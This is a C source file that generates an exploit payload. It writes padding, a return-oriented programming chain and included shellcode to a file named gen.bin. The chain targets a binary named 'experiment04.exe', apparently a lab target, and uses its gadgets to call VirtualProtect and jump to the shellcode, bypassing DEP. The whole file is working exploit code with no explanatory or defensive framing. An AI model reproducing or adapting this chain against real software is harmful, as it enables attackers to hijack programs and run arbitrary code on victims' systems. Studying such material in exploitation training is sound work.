#include <stdio.h>
#include <string.h>

typedef unsigned int u32;

u32 rop_chain[] = {
    // fill blank
    0x00000000, 0x01010101, 0x02020202, 0x03030303, 0x04040404, 
    0x05050505, 0x06060606, 0x07070707, 0x08080808, 0x09090909,
    0x0a0a0a0a, 0x0b0b0b0b, 0x0c0c0c0c, 0x0d0d0d0d, 0x0e0e0e0e,
    0x0f0f0f0f, 0x10101010, 0x11111111, 0x12121212, 0x13131313,
    0x14141414, 0x15151515, 0x16161616, 0x17171717, 0x18181818,
    0x19191919, 0x1a1a1a1a, 0x1b1b1b1b, 0x1c1c1c1c, 0x1d1d1d1d,
    0x1e1e1e1e, 0x1f1f1f1f, 0x20202020, 0x21212121, 0x22222222,
    0x23232323, 0x24242424, 0x25252525, 0x26262626, 0x27272727,
    0x28282828, 0x29292929, 0x2a2a2a2a, 0x2b2b2b2b, 0x2c2c2c2c,
    0x2d2d2d2d, 0x2e2e2e2e, 0x2f2f2f2f, 0x30303030, 0x31313131,
    //[---INFO:gadgets_to_set_ebp:---]
    0x00e186c4,  // POP EBP // RETN [experiment04.exe] 
    0,
    0,
    0x00e186c4,  // skip 4 bytes [experiment04.exe]
    //[---INFO:gadgets_to_set_ebx:---]
    0x00d34bcf,  // POP EBX // RETN [experiment04.exe] 
    0x00000201,  // 0x00000201-> ebx
    //[---INFO:gadgets_to_set_edx:---]
    0x00b2515a,  // POP EDX // RETN [experiment04.exe] 
    0x00000040,  // 0x00000040-> edx
    //[---INFO:gadgets_to_set_ecx:---]
    0x00dd3b2d,  // POP ECX // RETN [experiment04.exe] 
    0x00efe23a,  // &Writable location [experiment04.exe]
    //[---INFO:gadgets_to_set_edi:---]
    0x00d211c9,  // POP EDI // RETN [experiment04.exe] 
    0x00757104,  // RETN (ROP NOP) [experiment04.exe]
    //[---INFO:gadgets_to_set_esi:---]
    0x00b8c6d7,  // POP ESI // RETN [experiment04.exe] 
    0x0074d258,  // JMP [EAX] [experiment04.exe]
    0x00b2a7be,  // POP EAX // RETN [experiment04.exe] 
    0x00f00838,  // ptr to &VirtualProtect() [IAT experiment04.exe]
    //[---INFO:pushad:---]
    0x00b12c66,  // PUSHAD // RETN [experiment04.exe] 
    //[---INFO:extras:---]
    0x008f8e22,  // ptr to 'jmp esp' [experiment04.exe]
    // following with shellcode
};

#include "shellcode.c"

int main() {
    // Open Files
    FILE *fp = fopen("gen.bin", "wb");
    // Set Rop Chain
    int siz = sizeof(rop_chain) / sizeof(u32);
    for(int i = 0; i < siz; i++) {
        u32 x = rop_chain[i];
        fwrite(&x, 1, sizeof(x), fp);
    }
    // Set Shell Code
    fwrite(shellCode, 1, CODE_SIZE, fp);
    fclose(fp);
    return 0;
}